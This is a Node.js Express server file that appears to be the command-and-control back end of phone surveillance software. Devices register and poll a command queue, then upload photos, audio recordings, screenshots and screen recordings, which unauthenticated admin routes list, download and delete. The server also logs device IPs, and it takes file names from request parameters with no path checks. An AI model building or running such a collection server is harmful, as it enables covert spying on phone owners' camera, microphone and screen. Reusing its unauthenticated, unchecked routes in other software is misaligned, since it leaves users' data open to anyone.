const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory
const UPLOAD_DIR = 'uploads';
const PHOTOS_DIR = path.join(UPLOAD_DIR, 'photos');
const RECORDINGS_DIR = path.join(UPLOAD_DIR, 'recordings');
const SCREENSHOTS_DIR = path.join(UPLOAD_DIR, 'screenshots');
const SCREEN_RECORDINGS_DIR = path.join(UPLOAD_DIR, 'screen_recordings');

// Ensure directories exist
[UPLOAD_DIR, PHOTOS_DIR, RECORDINGS_DIR, SCREENSHOTS_DIR, SCREEN_RECORDINGS_DIR].forEach(dir => {
  fs.ensureDirSync(dir);
});

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    if (file.fieldname === 'screenshot') {
      cb(null, SCREENSHOTS_DIR);
    } else if (file.fieldname === 'audio_file') {
      cb(null, RECORDINGS_DIR);
    } else if (file.fieldname === 'file') {
      cb(null, SCREEN_RECORDINGS_DIR);
    } else if (file.fieldname === 'photo') {
      cb(null, PHOTOS_DIR);
    } else {
      cb(null, UPLOAD_DIR);
    }
  },
  filename: function (req, file, cb) {
    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
    const timestamp = Date.now();
    const ext = path.extname(file.originalname);
    const uniqueName = `${device_id}_${timestamp}${ext}`;
    cb(null, uniqueName);
  }
});

const upload = multer({ storage: storage });

// In-memory storage
const registeredDevices = {};
const deviceCommands = {};
const deviceStatus = {};

// Helper function to get device IP
const getDeviceIP = (req) => {
  return req.ip || req.connection.remoteAddress || 'unknown';
};

// ==================== ROUTES ====================

// Home route
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'Mobile WiFi Server - Node.js',
    server_url: `${req.protocol}://${req.get('host')}`,
    endpoints: {
      register_device: '/register_device [POST]',
      update_status: '/update_status [POST]',
      get_commands: '/get_commands/:device_id [GET]',
      upload_photo: '/upload_photo [POST]',
      upload_screen_recording: '/upload_screen_recording [POST]',
      screenshot_upload: '/screenshot/upload [POST]',
      upload_data: '/data [POST]',
      admin_devices: '/admin/devices [GET]',
      admin_photos: '/admin/photos [GET]',
      delete_photo: '/admin/photos/:filename [DELETE]',
      send_command: '/admin/send_command [POST]'
    }
  });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.json({ status: 'pong', timestamp: new Date().toISOString() });
});

// Register device
app.post('/register_device', (req, res) => {
  try {
    const { device_id } = req.body;
    
    if (!device_id) {
      return res.status(400).json({ error: 'Device ID is required' });
    }
    
    registeredDevices[device_id] = {
      registered_at: new Date().toISOString(),
      last_seen: new Date().toISOString(),
      status: 'active',
      ip: getDeviceIP(req)
    };
    
    if (!deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
    }
    
    console.log(`Device registered: ${device_id}`);
    
    res.json({
      status: 'success',
      message: `Device ${device_id} registered successfully`,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Update device status
app.post('/update_status', (req, res) => {
  try {
    const { device_id, status = 'idle', recording = false, screen_recording = false } = req.body;
    
    if (!device_id) {
      return res.status(400).json({ error: 'Device ID is required' });
    }
    
    deviceStatus[device_id] = {
      status,
      recording,
      screen_recording,
      last_updated: new Date().toISOString(),
      ip: getDeviceIP(req)
    };
    
    // Update last seen
    if (registeredDevices[device_id]) {
      registeredDevices[device_id].last_seen = new Date().toISOString();
    }
    
    console.log(`Status updated - Device: ${device_id}, Status: ${status}`);
    
    res.json({
      status: 'updated',
      device_id: device_id,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Status update error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get commands for device
app.get('/get_commands/:device_id', (req, res) => {
  try {
    const { device_id } = req.params;
    
    if (!registeredDevices[device_id]) {
      return res.status(404).json({ error: 'Device not registered' });
    }
    
    // Update last seen
    registeredDevices[device_id].last_seen = new Date().toISOString();
    
    // Get commands
    const commands = deviceCommands[device_id] || [];
    
    // Clear commands after sending
    deviceCommands[device_id] = [];
    
    console.log(`Sending ${commands.length} commands to device ${device_id}`);
    
    res.json({
      device_id: device_id,
      commands: commands,
      timestamp: new Date().toISOString(),
      count: commands.length
    });
    
  } catch (error) {
    console.error('Get commands error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload photo
app.post('/upload_photo', upload.single('photo'), (req, res) => {
  try {
    if (!req.file) {
      // Try base64 data
      if (req.body && req.body.data) {
        const device_id = req.headers['x-device-id'] || req.body.device_id || 'unknown';
        const filename = req.headers['x-file-name'] || `photo_${Date.now()}.jpg`;
        
        // Handle base64 encoded photo
        const base64Data = req.body.data.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        const uniqueFilename = `${device_id}_${Date.now()}_${filename}`;
        const filepath = path.join(PHOTOS_DIR, uniqueFilename);
        
        fs.writeFileSync(filepath, buffer);
        
        const sizeKB = (buffer.length / 1024).toFixed(2);
        
        console.log(`📸 Photo uploaded (base64) - Device: ${device_id}, Size: ${sizeKB} KB, File: ${uniqueFilename}`);
        
        return res.json({
          status: 'success',
          message: 'Photo uploaded successfully',
          filename: uniqueFilename,
          size_kb: sizeKB,
          device_id: device_id,
          url: `/uploads/photos/${uniqueFilename}`
        });
      }
      
      return res.status(400).json({ error: 'No photo data received' });
    }
    
    // File upload
    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
    const filename = req.file.filename;
    const filepath = req.file.path;
    
    const stats = fs.statSync(filepath);
    const sizeKB = (stats.size / 1024).toFixed(2);
    
    console.log(`📸 Photo uploaded (file) - Device: ${device_id}, Size: ${sizeKB} KB, File: ${filename}`);
    
    res.json({
      status: 'success',
      message: 'Photo uploaded successfully',
      filename: filename,
      size_kb: sizeKB,
      device_id: device_id,
      url: `/uploads/photos/${filename}`
    });
    
  } catch (error) {
    console.error('Photo upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload screen recording
app.post('/upload_screen_recording', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file received' });
    }
    
    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
    const filename = req.file.filename;
    
    const stats = fs.statSync(req.file.path);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
    
    console.log(`Screen recording uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
    
    res.json({
      status: 'success',
      message: 'Screen recording uploaded',
      filename: filename,
      size_mb: sizeMB,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Screen recording upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload screenshot
app.post('/screenshot/upload', upload.single('screenshot'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No screenshot file' });
    }
    
    const device_id = req.body.device_id || 'unknown';
    const command_id = req.body.command_id || 'unknown';
    const filename = req.file.filename;
    
    const stats = fs.statSync(req.file.path);
    const sizeKB = (stats.size / 1024).toFixed(2);
    
    console.log(`Screenshot uploaded - Device: ${device_id}, Size: ${sizeKB} KB`);
    
    res.json({
      status: 'success',
      message: 'Screenshot uploaded',
      filename: filename,
      size_kb: sizeKB,
      device_id: device_id,
      command_id: command_id
    });
    
  } catch (error) {
    console.error('Screenshot upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload audio/data
app.post('/data', upload.single('audio_file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No audio file' });
    }
    
    const device_id = req.body.device_id || 'unknown';
    const filename = req.file.filename;
    
    const stats = fs.statSync(req.file.path);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
    
    console.log(`Audio uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
    
    res.json({
      status: 'success',
      message: 'Audio uploaded',
      filename: filename,
      size_mb: sizeMB,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Audio upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ==================== ADMIN ROUTES ====================

// Admin: Get all devices
app.get('/admin/devices', (req, res) => {
  try {
    const devicesList = Object.keys(registeredDevices).map(device_id => {
      const deviceInfo = registeredDevices[device_id] || {};
      const statusInfo = deviceStatus[device_id] || {};
      
      return {
        device_id: device_id,
        registered_at: deviceInfo.registered_at,
        last_seen: deviceInfo.last_seen,
        status: statusInfo.status || 'unknown',
        recording: statusInfo.recording || false,
        screen_recording: statusInfo.screen_recording || false,
        pending_commands: (deviceCommands[device_id] || []).length,
        ip: deviceInfo.ip || 'unknown'
      };
    });
    
    res.json({
      status: 'success',
      total_devices: devicesList.length,
      devices: devicesList,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Get devices error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Get all photos
app.get('/admin/photos', (req, res) => {
  try {
    console.log('📸 Request for photos list');
    
    // Check if photos directory exists
    if (!fs.existsSync(PHOTOS_DIR)) {
      return res.json({
        success: true,
        photos: [],
        count: 0,
        message: 'No photos directory found'
      });
    }
    
    // Read all files from photos directory
    const files = fs.readdirSync(PHOTOS_DIR)
      .filter(file => {
        // Filter only image files
        const ext = path.extname(file).toLowerCase();
        return ['.jpg', '.jpeg', '.png', '.gif', '.bmp'].includes(ext);
      })
      .map(file => {
        const filePath = path.join(PHOTOS_DIR, file);
        const stats = fs.statSync(filePath);
        
        // Extract device ID from filename
        let deviceId = 'unknown';
        if (file.includes('_')) {
          const parts = file.split('_');
          deviceId = parts[0];
        }
        
        return {
          filename: file,
          device_id: deviceId,
          url: `${req.protocol}://${req.get('host')}/uploads/photos/${file}`,
          download_url: `${req.protocol}://${req.get('host')}/download/photo/${file}`,
          size: stats.size,
          size_formatted: formatFileSize(stats.size),
          created: stats.birthtime,
          created_formatted: new Date(stats.birthtime).toLocaleString(),
          modified: stats.mtime
        };
      })
      .sort((a, b) => new Date(b.created) - new Date(a.created)); // Newest first
    
    console.log(`Found ${files.length} photos`);
    
    res.json({
      success: true,
      photos: files,
      count: files.length,
      server_url: `${req.protocol}://${req.get('host')}`,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Get photos error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Helper function to format file size
function formatFileSize(bytes) {
  if (bytes < 1024) return bytes + ' bytes';
  else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' KB';
  else return (bytes / 1048576).toFixed(2) + ' MB';
}

// Admin: Delete a photo
app.delete('/admin/photos/:filename', (req, res) => {
  try {
    const { filename } = req.params;
    const filePath = path.join(PHOTOS_DIR, filename);
    
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'Photo not found' });
    }
    
    fs.unlinkSync(filePath);
    console.log(`🗑️ Photo deleted: ${filename}`);
    
    res.json({
      success: true,
      message: `Photo ${filename} deleted successfully`
    });
    
  } catch (error) {
    console.error('Delete photo error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Clear all photos
app.delete('/admin/photos', (req, res) => {
  try {
    if (fs.existsSync(PHOTOS_DIR)) {
      const files = fs.readdirSync(PHOTOS_DIR);
      files.forEach(file => {
        const filePath = path.join(PHOTOS_DIR, file);
        fs.unlinkSync(filePath);
      });
      console.log(`🗑️ Cleared all photos (${files.length} files)`);
    }
    
    res.json({
      success: true,
      message: 'All photos cleared successfully'
    });
    
  } catch (error) {
    console.error('Clear photos error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Send command to device
app.post('/admin/send_command', (req, res) => {
  try {
    const { device_id, command } = req.body;
    
    if (!device_id || !command) {
      return res.status(400).json({ error: 'Device ID and command are required' });
    }
    
    if (!registeredDevices[device_id]) {
      return res.status(404).json({ error: 'Device not registered' });
    }
    
    if (!deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
    }
    
    deviceCommands[device_id].push(command);
    
    console.log(`Command sent - Device: ${device_id}, Command: ${command}`);
    
    res.json({
      status: 'success',
      message: `Command '${command}' sent to device ${device_id}`,
      device_id: device_id,
      command: command,
      pending_commands: deviceCommands[device_id].length
    });
    
  } catch (error) {
    console.error('Send command error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Clear commands for device
app.delete('/admin/clear_commands/:device_id', (req, res) => {
  try {
    const { device_id } = req.params;
    
    if (deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
      console.log(`Commands cleared for device: ${device_id}`);
      res.json({
        status: 'success',
        message: `Commands cleared for device ${device_id}`
      });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
    
  } catch (error) {
    console.error('Clear commands error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Download file
app.get('/download/:type/:filename', (req, res) => {
  try {
    const { type, filename } = req.params;
    
    let directory;
    switch (type) {
      case 'photo': directory = PHOTOS_DIR; break;
      case 'audio': directory = RECORDINGS_DIR; break;
      case 'screenshot': directory = SCREENSHOTS_DIR; break;
      case 'screen_recording': directory = SCREEN_RECORDINGS_DIR; break;
      default: return res.status(400).json({ error: 'Invalid file type' });
    }
    
    const filepath = path.join(directory, filename);
    
    if (!fs.existsSync(filepath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    res.download(filepath);
    
  } catch (error) {
    console.error('Download error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get single photo info
app.get('/photo/:filename', (req, res) => {
  try {
    const { filename } = req.params;
    const filepath = path.join(PHOTOS_DIR, filename);
    
    if (!fs.existsSync(filepath)) {
      return res.status(404).json({ error: 'Photo not found' });
    }
    
    const stats = fs.statSync(filepath);
    
    res.json({
      success: true,
      filename: filename,
      url: `${req.protocol}://${req.get('host')}/uploads/photos/${filename}`,
      size: stats.size,
      created: stats.birthtime,
      modified: stats.mtime
    });
    
  } catch (error) {
    console.error('Get photo error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Serve static files
app.use('/uploads/photos', express.static(PHOTOS_DIR));
app.use('/uploads/recordings', express.static(RECORDINGS_DIR));
app.use('/uploads/screenshots', express.static(SCREENSHOTS_DIR));
app.use('/uploads/screen_recordings', express.static(SCREEN_RECORDINGS_DIR));

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(PORT, () => {
  console.log(`
  ==============================================
  🚀 MOBILE WIFI SERVER STARTED
  ==============================================
  📍 Port: ${PORT}
  📁 Uploads: ${UPLOAD_DIR}/
  🌐 URL: http://localhost:${PORT}
  ==============================================
  📸 Photos: /admin/photos [GET]
  📱 Devices: /admin/devices [GET]
  🎯 Commands: /admin/send_command [POST]
  📤 Upload: /upload_photo [POST]
  ==============================================
  ✅ Server is running...
  ==============================================
  `);
});
